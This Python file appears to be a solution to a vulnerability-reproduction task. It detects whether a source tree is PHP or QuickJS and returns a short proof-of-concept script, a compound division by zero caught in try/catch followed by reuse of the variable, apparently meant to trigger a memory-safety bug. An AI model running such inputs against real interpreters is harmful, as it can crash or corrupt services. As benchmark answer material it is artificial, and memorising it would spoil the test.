import os
import re
import tarfile
from typing import Iterable, Optional, Tuple


class _SourceReader:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._is_dir = os.path.isdir(src_path)
        self._tar = None
        if not self._is_dir:
            self._tar = tarfile.open(src_path, "r:*")

    def close(self):
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass
            self._tar = None

    def iter_paths(self) -> Iterable[str]:
        if self._is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    yield os.path.relpath(p, self.src_path).replace("\\", "/")
        else:
            for m in self._tar.getmembers():
                if m.isfile():
                    yield m.name

    def read_bytes(self, rel_path: str, max_bytes: int = 1_000_000) -> Optional[bytes]:
        if self._is_dir:
            p = os.path.join(self.src_path, rel_path)
            try:
                with open(p, "rb") as f:
                    return f.read(max_bytes)
            except Exception:
                return None
        else:
            try:
                m = self._tar.getmember(rel_path)
            except Exception:
                return None
            if not m.isfile():
                return None
            try:
                f = self._tar.extractfile(m)
                if f is None:
                    return None
                try:
                    return f.read(max_bytes)
                finally:
                    try:
                        f.close()
                    except Exception:
                        pass
            except Exception:
                return None

    def read_text(self, rel_path: str, max_bytes: int = 1_000_000) -> Optional[str]:
        b = self.read_bytes(rel_path, max_bytes=max_bytes)
        if b is None:
            return None
        try:
            return b.decode("utf-8", "ignore")
        except Exception:
            try:
                return b.decode("latin-1", "ignore")
            except Exception:
                return None


def _detect_project(sr: _SourceReader) -> str:
    php_score = 0
    qjs_score = 0

    for p in sr.iter_paths():
        pl = p.lower()
        if "/zend/" in pl or pl.endswith("main/php.h") or pl.endswith("/php.h") or "/sapi/" in pl or pl.endswith("/zend_vm_def.h"):
            php_score += 3
        if "php-src" in pl or pl.endswith("/php.ini-development") or pl.endswith("/php.ini-production"):
            php_score += 2
        if pl.endswith("/quickjs.c") or pl.endswith("/quickjs.h") or "/quickjs/" in pl or pl.endswith("/qjs.c"):
            qjs_score += 3
        if "quickjs" in pl and (pl.endswith(".c") or pl.endswith(".h") or pl.endswith(".md")):
            qjs_score += 1

        if php_score >= 6 and php_score >= qjs_score + 2:
            return "php"
        if qjs_score >= 6 and qjs_score >= php_score + 2:
            return "quickjs"

    if php_score >= qjs_score and php_score > 0:
        return "php"
    if qjs_score > 0:
        return "quickjs"
    return "unknown"


def _detect_php_input_mode(sr: _SourceReader) -> str:
    # Returns "eval" or "file"
    # Prefer eval if any harness uses zend_eval_stringl / zend_eval_string_ex
    eval_hit = False
    file_hit = False

    interesting = []
    for p in sr.iter_paths():
        pl = p.lower()
        if any(tok in pl for tok in ("fuzz", "fuzzer", "afl", "honggfuzz", "libfuzzer")) and (pl.endswith(".c") or pl.endswith(".cc") or pl.endswith(".cpp") or pl.endswith(".h")):
            interesting.append(p)
        elif "llvmfuzzertestoneinput" in pl:
            interesting.append(p)

    if not interesting:
        # scan a small subset of C files
        for p in sr.iter_paths():
            pl = p.lower()
            if pl.endswith(".c") or pl.endswith(".cc") or pl.endswith(".cpp"):
                interesting.append(p)
                if len(interesting) >= 50:
                    break

    needles_eval = ("zend_eval_stringl", "zend_eval_string_ex", "zend_eval_string", "eval_stringl")
    needles_file = ("php_execute_script", "zend_execute_scripts", "compile_file", "zend_compile_file")
    needles_fuzzer = ("LLVMFuzzerTestOneInput",)

    for p in interesting[:300]:
        s = sr.read_text(p, max_bytes=1_000_000)
        if not s:
            continue
        if any(n in s for n in needles_fuzzer):
            # helps ensure we're looking at harness, but not required
            pass
        if any(n in s for n in needles_eval):
            eval_hit = True
        if any(n in s for n in needles_file):
            file_hit = True
        if eval_hit:
            return "eval"

    return "file" if file_hit else "eval"


def _poc_php(mode: str) -> bytes:
    # Dynamic string to ensure heap allocation; compound division by zero; catch; use value again.
    # Use non-capturing catch (PHP 8+) to reduce length.
    code = '$a=str_repeat("A",1024);try{$a/=0;}catch(DivisionByZeroError){}strlen($a);'
    if mode == "file":
        code = "<?php " + code
    return code.encode("ascii", "ignore")


def _poc_quickjs() -> bytes:
    # BigInt division by zero throws; compound assignment; then reuse variable
    code = "var a=1n<<200n;try{a/=0n}catch(e){}a+1n"
    return code.encode("ascii", "ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        sr = _SourceReader(src_path)
        try:
            proj = _detect_project(sr)
            if proj == "php":
                mode = _detect_php_input_mode(sr)
                return _poc_php(mode)
            if proj == "quickjs":
                return _poc_quickjs()
            # Default to PHP-eval style as a common harness style for scripting engines in this category
            return _poc_php("eval")
        finally:
            sr.close()